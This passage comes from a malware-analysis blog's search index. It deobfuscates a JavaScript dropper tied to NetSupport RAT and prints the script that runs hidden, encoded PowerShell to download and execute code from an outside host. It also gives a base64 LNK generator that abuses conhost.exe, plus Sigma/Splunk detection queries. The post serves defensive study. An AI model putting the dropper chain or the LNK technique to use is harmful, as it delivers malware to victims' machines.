oMKilXfTnLOHCUhAFBP + \" -nop -w hidden \" + \"-ep bypaSS -enC SQ\" + \"BFAFgAIAAoA\" + \"E4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAb\" + \"gB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHI\" + \"AaQBuAGcAKA\" + \"AiAGgAdAB0AHAA\" + \"OgAvAC8\" + \"AMQBvAHQ\" + \"AYQBsAC4AYwBvAG0ALwBpAG4AZABlAHgALwBpAG4AZA\" + \"BlAHgALgBwAGgAcAAiACkA\", \"\", \"open\", 0);\n}\noMKilXfTnLOHCUhAFBP = \"sheLl\";\nYZqOsTxnMmpABJCF = new ActiveXObject(oMKilXfTnLOHCUhAFBP + \".\" + \"ApPlIcAtIon\");\nFkLgcBCiVTGsmxdvpeb = new ActiveXObject(\"SCRiPtIng.filesystemobJECt\");\nif (FkLgcBCiVTGsmxdvpeb.FolderExists(\"C:pROgRamdAtamIcRosOftwINdoWs\")) {\n  YZqOsTxnMmpABJCF.ShellExecute(\"cmd\", \"/c Power\" + oMKilXfTnLOHCUhAFBP + \" -nop -w hidden \" + \"-ep bypaSS -enC SQ\" + \"BFAFgAIAAoA\" + \"E4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAb\" + \"gB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHI\" + \"AaQBuAGcAKA\" + \"AiAGgAdAB0AHAA\" + \"OgAvAC8\" + \"AMQBvAHQ\" + \"AYQBsAC4AYwBvAG0ALwBpAG4AZABlAHgALwBpAG4AZA\" + \"BlAHgALgBwAGgAcAAiACkA\", \"\", \"open\", 0);\n}\n</code></pre> <p>Finally we can do some replace works to make it easier to analyze:</p> <pre><code>str_shell = \"Shell\";\nobj_ActX_Shell_application = new ActiveXObject(\"Shell.Application\");\nobj_ActX_scripting_filesysobj = new ActiveXObject(\"Scripting.FileSystemObject\");\nif (obj_ActX_scripting_filesysobj.FolderExists(\"C:pROgRamdAtamIcRosOftwINdoWs\")) {\n  obj_ActX_Shell_application.ShellExecute(\"cmd\", \"/c PowerShell -nop -w hidden -ep bypaSS -enC SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQBvAHQAYQBsAC4AYwBvAG0ALwBpAG4AZABlAHgALwBpAG4AZABlAHgALgBwAGgAcAAiACkA\", \"\", \"open\", 0);\n}\n</code></pre> <ul> <li>Then it will run a hidden &amp; encoded powershell script</li> </ul> <p>We may finally use ChatGPT to decode the command:</p> <pre><code>Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://1ota1.com/index/index.php')\n</code></pre> <ul> <li>Same as the LNK file, the purpose of the JavaScript is to download an aiitional obfuscated script to create malicious NetSupport RAT package for this infection</li> </ul> <p></p>","tags":["malware analysis","JavaScript"]},{"location":"malwareanalysis/20231102-Deobfuscate-JavaScript/#techniques-mimicking","title":"Techniques Mimicking","text":"","tags":["malware analysis","JavaScript"]},{"location":"malwareanalysis/20231102-Deobfuscate-JavaScript/#run-powershell-with-javascript-file-via-wscript","title":"Run PowerShell with JavaScript file via WScript","text":"<p>By default, <code>.js</code> file can be run with Windows Based Script Host (WScript.exe). You may run the following JavaScript file - which runs <code>echo \"Hello World from Malware!</code> with PowerShell:</p> <pre><code>obj_ActX_Shell_application = new ActiveXObject(\"Shell.Application\");\nobj_ActX_Shell_application.ShellExecute(\"cmd\", \"/c PowerShell -nop -w hidden -ep bypaSS -enC ZQBjAGgAbwAgACIASABlAGwAbABvACAAV\" + \"wBvAHIAbABkACAAZgByAG8AbQAgAE0AYQBsAHcAYQByAGUAIQAiAA==\", \"\", \"open\", 0);\n</code></pre> <p></p> <p>Run the <code>.js</code> file by double-clicking and open with Windows Based Script Host (WScript.exe) to mimick the technique.</p> <p></p>","tags":["malware analysis","JavaScript"]},{"location":"malwareanalysis/20231102-Deobfuscate-JavaScript/#run-powershell-with-conhostexe-via-lnk-file","title":"Run PowerShell with conhost.exe via LNK file","text":"<p>You may run the following PowerShell script to generate a LNK file, which invokes PowerShell to send a GET request to <code>https://google.com/robots.txt</code>:</p> <pre><code>$d64 = \"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\"\n$binary = [Convert]::FromBase64String($d64)\nSet-Content -Path .\\out.lnk -Value $binary -Encoding Byte\n</code></pre> <p>Double click the generate <code>.lnk</code> file to mimick the technique.</p> <p></p>","tags":["malware analysis","JavaScript"]},{"location":"malwareanalysis/20231102-Deobfuscate-JavaScript/#detections-with-sigma-splunk","title":"Detections with Sigma &amp; Splunk","text":"","tags":["malware analysis","JavaScript"]},{"location":"malwareanalysis/20231102-Deobfuscate-JavaScript/#run-powershell-with-javascript-file-via-wscript_1","title":"Run PowerShell with JavaScript file via WScript","text":"<ul> <li>Sigma Project: WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript</li> </ul> <pre><code>index=* EventCode=1 (\n  ( \n    OriginalFileName IN (\"wscript.exe\", \"cscript.exe\") OR Image IN (\"*\\\\wscript.exe\", \"*\\\\cscript.exe\") \n    AND CommandLine IN (\"*.js*\", \"*.jse*\", \"*.vba*\", \"*.vbe*\", \"*.vbs*\", \"*.wsf*\") \n  )\n  OR ParentCommandLine IN (\"*.js*\", \"*.jse*\", \"*.vba*\", \"*.vbe*\", \"*.vbs*\", \"*.wsf*\")\n) \n| table ParentCommandLine, CommandLine\n</code></pre>","tags":["malware analysis","JavaScript"]},{"location":"malwareanalysis/20231102-Deobfuscate-JavaScript/#run-powershell-with-conhostexe-via-lnk-file_1","title":"Run PowerShell with conhost.exe via LNK file","text":"<ul> <li>Sigma Project: Uncommon Child Process Of Conhost.EXE</li> </ul> <pre><code>index=* \nParentImage=\"*\\\\conhost.exe\" NOT (\n    Provider_Name=\"SystemTraceProvider-Process\" \n    OR (Provider_Name=\"Microsoft-Windows-Kernel-Process\" Image=\"*\\\\git.exe\" ParentCommandLine IN (\"* show --textconv *\", \"* cat-file -s *\")) \n    OR (ParentCommandLine=\"*C:\\\\WINDOWS\\\\system32\\\\conhost.exe 0x4*\" CommandLine IN (\"* show --textconv *\", \"* cat-file -s *\")) \n    OR (Provider_Name=\"Microsoft-Windows-Kernel-Process\" ParentCommandLine IN (\"* cat-file -s *\", \"*show --textconv*\") Image=\"C:\\\\Windows\\\\System32\\\\conhost.exe\") \n    OR (ParentCommandLine IN (\"\\\\??\\\\C:\\\\WINDOWS\\\\system32\\\\conhost.exe 0x4\", \"\\\\??\\\\C:\\\\WINDOWS\\\\system32\\\\conhost.exe 0xffffffff -ForceV1\") Image=\"C:\\\\Windows\\\\System32\\\\conhost.exe\") \n    OR (ParentCommandLine IN (\"\\\\??\\\\C:\\\\WINDOWS\\\\system32\\\\conhost.exe 0xffffffff -ForceV1'\", \"\\\\??\\\\C:\\\\WINDOWS\\\\system32\\\\conhost.exe 0x4'\") Image=\"C:\\\\Program Files\\\\Git\\\\mingw64\\\\bin\\\\git.exe\")\n)\n| table ParentCommandLine, CommandLine\n</code></pre>","tags":["malware analysis","JavaScript"]},{"location":"malwareanalysis/20231102-Deobfuscate-JavaScript/#references","title":"References","text":"<ul> <li>PAN Unit42 Investigation</li> <li>The DFIR Report: NetSupport Intrusion Results in Domain Compromise</li> <li>Sigma Project: WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript</li> <li>Sigma Project: Uncommon Child Process Of Conhost.EXE</li> </ul>","tags":["malware analysis","JavaScript"]},{"location":"tags/","title":"Tags","text":""},{"location":"tags/#adcs","title":"ADCS","text":"<ul> <li>202309 - Altered Security CESP-ADCS Review</li> </ul>"},{"location":"tags/#autoit","title":"AutoIt","text":"<ul> <li>202306 - AutoIt3 based USB Malware: The 0LIONW0 Worm (aka AutoIt.OTORUN.AC)</li> </ul>"},{"location":"tags/#certification","title":"Certification","text":"<ul> <li>202309 - Altered Security CESP-ADCS Review</li> </ul>"},{"location":"tags/#crypto-stealer","title":"Crypto Stealer","text":"<ul> <li>202310 - Extract &amp; Extract &amp; Extract</li> </ul>"},{"location":"tags/#exam","title":"Exam","text":"<ul> <li>202309 - Altered Security CESP-ADCS Review</li> </ul>"},{"location":"tags/#javascript","title":"JavaScript","text":"<ul> <li>202311 - JavaScript Deobfuscation &amp; conhost.exe LOLBAS</li> </ul>"},{"location":"tags/#redteaming","title":"RedTeaming","text":"<ul> <li>202309 - Altered Security CESP-ADCS Review</li> </ul>"},{"location":"tags/#stealer","title":"Stealer","text":"<ul> <li>202310 - Extract &amp; Extract &amp; Extract</li> </ul>"},{"location":"tags/#usb-malware","title":"USB Malware","text":"<ul> <li>202306 - AutoIt3 based USB Malware: The 0LIONW0 Worm (aka AutoIt.OTORUN.AC)</li> </ul>"},{"location":"tags/#worming","title":"Worming","text":"<ul> <li>202306 - AutoIt3 based USB Malware: The 0LIONW0 Worm (aka AutoIt.OTORUN.AC)</li> </ul>"},{"location":"tags/#dfir","title":"dfir","text":"<ul> <li>Powershell Obfuscation 1: Formatter</li> </ul>"},{"location":"tags/#malware-analysis","title":"malware analysis","text":"<ul> <li>Powershell Obfuscation 1: Formatter</li> <li>202311 - JavaScript Deobfuscation &amp; conhost.exe LOLBAS</li> </ul>"},{"location":"tags/#powershell","title":"powershell","text":"<ul> <li>Powershell Obfuscation 1: Formatter</li> </ul>"}]}